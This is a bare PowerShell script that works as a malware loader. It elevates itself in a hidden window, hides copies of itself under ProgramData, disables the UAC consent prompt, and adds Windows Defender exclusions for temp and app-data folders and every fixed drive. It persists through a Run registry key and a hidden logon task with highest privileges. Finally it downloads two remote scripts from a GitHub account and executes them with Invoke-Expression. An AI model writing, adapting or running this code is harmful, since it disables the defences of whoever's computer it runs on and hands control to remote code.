# Check if running as admin, relaunch with elevated privileges if not
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    try {
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs -WindowStyle Hidden -Wait -ErrorAction Stop
        exit 0
    }
    catch {
        throw
    }
}

# Initialize script variables
$scriptPath = $MyInvocation.MyCommand.Path
$scriptName = [System.IO.Path]::GetFileName($scriptPath)
$baseDir = "C:\ProgramData\SystemConfig"
$exeDir = Join-Path $baseDir "Bin"
$maxRetries = 5
$baseDelay = 1000
$maxDelay = 30000

# Function to retry an action with exponential backoff
function Invoke-Retry {
    param (
        [ScriptBlock]$Action,
        [int]$MaxRetries = 5,
        [int]$BaseDelay = 1000,
        [int]$MaxDelay = 30000
    )
    $retryCount = 0
    $success = $false
    while (-not $success -and $retryCount -lt $MaxRetries) {
        try {
            & $Action
            $success = $true
        }
        catch {
            $retryCount++
            if ($retryCount -eq $MaxRetries) { throw }
            $delay = [math]::Min($BaseDelay * [math]::Pow(2, $retryCount), $MaxDelay) + (Get-Random -Minimum 0 -Maximum 100)
            Start-Sleep -Milliseconds $delay
        }
    }
}

# Job 1: Create directories and copy script
$job1 = Start-Job -ScriptBlock {
    param($baseDir, $exeDir, $scriptPath, $scriptName)
    $scriptDir = Join-Path $baseDir $scriptName
    $dirs = @($baseDir, $exeDir)
    foreach ($dir in $dirs) {
        if (-not (Test-Path $dir)) {
            New-Item -Path $dir -ItemType Directory -Force -ErrorAction Stop | Out-Null
            Set-ItemProperty -Path $dir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction Stop
        }
    }
    if (-not (Test-Path $scriptDir)) {
        Copy-Item -Path $scriptPath -Destination $scriptDir -Force -ErrorAction Stop
        Set-ItemProperty -Path $scriptDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction Stop
    }
} -ArgumentList $baseDir, $exeDir, $scriptPath, $scriptName

# Job 2: Disable UAC prompt
$job2 = Start-Job -ScriptBlock {
    param($uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", $uacName = "ConsentPromptBehaviorAdmin", $uacValue = 0)
    if ((Get-ItemProperty -Path $uacPath -Name $uacName -ErrorAction SilentlyContinue).$uacName -ne $uacValue) {
        Set-ItemProperty -Path $uacPath -Name $uacName -Value $uacValue -ErrorAction Stop
    }
}

# Wait for and clean up jobs 1 and 2
Wait-Job -Job $job1, $job2 -Timeout 300 | Out-Null
if ($job1.State -ne 'Completed' -or $job2.State -ne 'Completed') {
    throw "err"
}
Remove-Job -Job $job1, $job2

# Add Windows Defender exclusions
Invoke-Retry -Action {
    $exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath
    $pathsToAdd = @($env:TEMP, $env:APPDATA, $env:LOCALAPPDATA, "C:\Program Files") + 
                  (Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | 
                   Select-Object -ExpandProperty DeviceID | ForEach-Object { "$_\" })
    $newPaths = $pathsToAdd | Where-Object { $exclusions -notcontains $_ }
    if ($newPaths) {
        Add-MpPreference -ExclusionPath $newPaths -ErrorAction Stop
    }
}

# Job 3: Add script to startup registry
$job3 = Start-Job -ScriptBlock {
    param($baseDir, $scriptName)
    $scriptDir = Join-Path $baseDir $scriptName
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    $regName = [System.IO.Path]::GetFileNameWithoutExtension($scriptName)
    $regValue = "powershell.exe -ExecutionPolicy Bypass -File `"$scriptDir`" -WindowStyle Hidden"
    if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
        New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -ErrorAction Stop
    }
} -ArgumentList $baseDir, $scriptName

# Job 4: Create scheduled task
$job4 = Start-Job -ScriptBlock {
    param($baseDir, $scriptName)
    $scriptDir = Join-Path $baseDir $scriptName
    $taskName = [System.IO.Path]::GetFileNameWithoutExtension($scriptName)
    if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$scriptDir`" -WindowStyle Hidden"
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -GroupId "Users" -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Runs $taskName at login" -ErrorAction Stop
    }
} -ArgumentList $baseDir, $scriptName

# Wait for and clean up jobs 3 and 4
Wait-Job -Job $job3, $job4 -Timeout 300 | Out-Null
if ($job3.State -ne 'Completed' -or $job4.State -ne 'Completed') {
    throw "err"
}
Remove-Job -Job $job3, $job4

# Download and execute getexe.ps1
Invoke-Retry -Action {
    $webClient = New-Object System.Net.WebClient
    try {
        $scriptContent = $webClient.DownloadString("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/getexe.ps1")
        if (-not $scriptContent) { throw "err" }
        Invoke-Expression $scriptContent -ErrorAction Stop
    }
    finally {
        $webClient.Dispose()
    }
}

# Download and execute runplugins.ps1
Invoke-Retry -Action {
    $webClient = New-Object System.Net.WebClient
    try {
        $scriptContent = $webClient.DownloadString("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/runplugins.ps1")
        if (-not $scriptContent) { throw "err" }
        Invoke-Expression $scriptContent -ErrorAction Stop
    }
    finally {
        $webClient.Dispose()
    }
}
